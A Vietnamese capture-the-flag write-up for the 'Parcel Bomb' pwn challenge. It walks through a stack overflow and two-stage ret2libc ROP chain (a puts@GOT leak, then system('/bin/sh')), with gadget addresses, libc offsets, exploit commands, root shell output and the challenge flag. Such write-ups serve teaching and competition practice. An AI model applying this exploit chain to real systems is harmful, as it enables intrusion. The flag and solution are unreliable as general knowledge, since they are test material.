---
title: "Parcel Bomb — Pwn (Medium)"
date: 2026-09-28 16:53:17 +0700
lastmod_at: 2026-09-28 16:53:17 +0700
categories: [Pwn]
tags: [h7ctf-quals, Pwn]
image:
  path: /CTFWU/H7CTF%202026%20Quals/arcel-bomb/files/de.png
---
{% raw %}
**Flag:** `H7CTF{0b79ca94-3b66-4509-9365-34d224d5cfe2}`
**Remote:** `nc pwn.h7tex.com 41136`
**Files:** `dispatch.zip` (1.03 MiB, sha256 `72f6e078…`) gồm `dispatch` (ELF64 ET_EXEC, sha256 `d946ba60…`), `libc.so.6` (glibc 2.39-0ubuntu8.9), `ld-linux-x86-64.so.2`, `README.txt`.

## Đề bài

Một terminal "Sparrow Freight dispatch" hỏi waybill number rồi log lại. Buffer 64 byte nhưng
`read` lấy 512 byte, và binary không cho sẵn `system` hay chuỗi `/bin/sh`. Mục tiêu: lấy flag từ
instance đang chạy.

## Phân tích ban đầu

```
$ node ~/.qoder/skills/ctf-solve/scripts/triage.cjs dispatch
class=64-bit type=ET_EXEC (no PIE)  entry=0x401090  PIE=no RELRO=yes STACK=non-exec
$ readelf --dyn-syms -W dispatch
puts  read  setvbuf  __libc_start_main  stdout      # không có system/execve
```

`objdump -d -M intel` cho toàn bộ chương trình chỉ 3 hàm đáng kể:

| địa chỉ | nội dung |
| --- | --- |
| `0x401176` | `pop rdi ; ret` (gadget nhúng sẵn), `0x401177` = `ret` |
| `0x401178` | `vuln()`: `puts(prompt)`; `read(0, rbp-0x40, 0x200)`; `puts("waybill logged.")`; `leave; ret` |
| `0x4011bb` | `main()`: `setvbuf(stdout, NULL, _IONBF, 0)`; `puts(banner)`; `call vuln` |

Mitigation từng cái một:

- Không canary. Symtab không có `__stack_chk_fail`, nên `read` 512 byte vào buffer 64 byte ghi
  thẳng lên saved rbp và return address. Offset tới return address = `0x40 + 8 = 72`.
- No PIE, nên mọi gadget và mọi GOT slot của binary đều là hằng số đã biết.
- Full RELRO. `GNU_RELRO` phủ `0x403df8 + 0x208` nên `.got`/`.got.plt` chỉ đọc, loại ret2got-plt.
- NX, nên không đặt shellcode trên stack.

Còn lại một trở ngại: chương trình không bao giờ in nội dung buffer, nên overflow đơn phát này
không tự leak được libc, mà libc thì nằm ở đâu đó trong 512 byte `read` cho phép.

Banner nhận từ `pwn.h7tex.com:41136` khớp từng byte với chuỗi trong `dispatch`, xác nhận instance chạy đúng binary đã cho nên phân tích tĩnh là đủ (host win32 không có qemu/docker nên không thi hành ELF local).

## Chuỗi khai thác

### Bước 1: tự tạo leak bằng ROP, không cần libc base

`puts` đã được gọi để in prompt, nên lazy binding đã resolve `puts@GOT` tại `0x404000` thành con trỏ thật trong libc. Gọi lại `puts@plt` với `rdi = 0x404000` sẽ in đúng 6 byte của con trỏ đó (`stdout` đang `_IONBF` nên về ngay). Sau đó trả về `vuln` (`0x401178`) để overflow lần hai trong cùng connection, vì không PIE nên layout stack lần hai giống hệt lần một.

```
pad(72) | pop_rdi_ret | 0x404000 | ret | puts@plt | ret | 0x401178(vuln)
```

### Bước 2: căn chỉnh 16 byte

Tại `vuln`, `rsp` lúc vào hàm `≡ 8 (mod 16)` (suy ra từ `and rsp,-16` trong `_start` và `push rbp` trong `main`). Sau `leave; ret` thì `rsp ≡ 0`, và ABI đòi callee phải thấy `rsp ≡ 8` ở instruction đầu tiên, nên:

- phải chèn một `ret` (`0x401177`, lấy miễn phí từ đuôi `pop_rdi_ret`) trước `puts@plt`, nếu không `puts` chạy với stack lệch 8 byte và ăn `SIGSEGV` trong `movaps`;
- stage 1 phải pop chẵn số qword. Với 6 qword (48 byte) thì frame `vuln` lần hai vào với `rsp ≡ 8` đúng như lần một, nghĩa là cả hai lần `puts` bên trong `vuln` và `system` ở stage 2 đều không cần chỉnh thêm;
- cùng lý do đó, stage 2 cũng giữ khuôn `pop_rdi_ret | arg | ret | target`.

### Bước 3: chi tiêu leak

```
$ python exploit.py pwn.h7tex.com 41136 "id; ls -la; cat flag flag.txt /flag /flag.txt 2>/dev/null; ls /"
[*] leaked bytes: c07c88edae7f0a (7)
[+] puts -> 0x7faeed887cc0, libc base = 0x7faeed800000
[*] post-exploitation output (1378 bytes):
waybill logged.
uid=0(root) gid=0(root) groups=0(root)
...
-rw-r--r--  1 root root   44 Sep 26 05:28 flag
H7CTF{0b79ca94-3b66-4509-9365-34d224d5cfe2}
```

`0x7faeed887cc0 - 0x87cc0 = 0x7faeed800000` (chẵn trang, `0x7f…` đúng vùng mmap) với `system = base + 0x58750`, `"/bin/sh" = base + 0x1cc42f` lấy từ `libc.so.6` của đề:

```
pad(72) | pop_rdi_ret | base+0x1cc42f | ret | base+0x58750(system)
```

`system()` thừa hưởng stdin/stdout là socket nên shell tương tác trực tiếp trên connection, chạy với `uid=0` trong container, flag nằm ở `/flag`.

Hai payload gửi bằng một connection duy nhất vì ASLR re-randomize mỗi lần connect: ba attempt đầu leak ra ba base khác nhau (`0x7f57a5a00000`, `0x7f57c4c00000`, `0x7f3bfbc00000`), nên leak chỉ có giá trị trong đúng connection sinh ra nó.

## Flag
```
H7CTF{0b79ca94-3b66-4509-9365-34d224d5cfe2}
```

Chạy lại: `python exploit.py pwn.h7tex.com 41136 "cat /flag"`

{% endraw %}
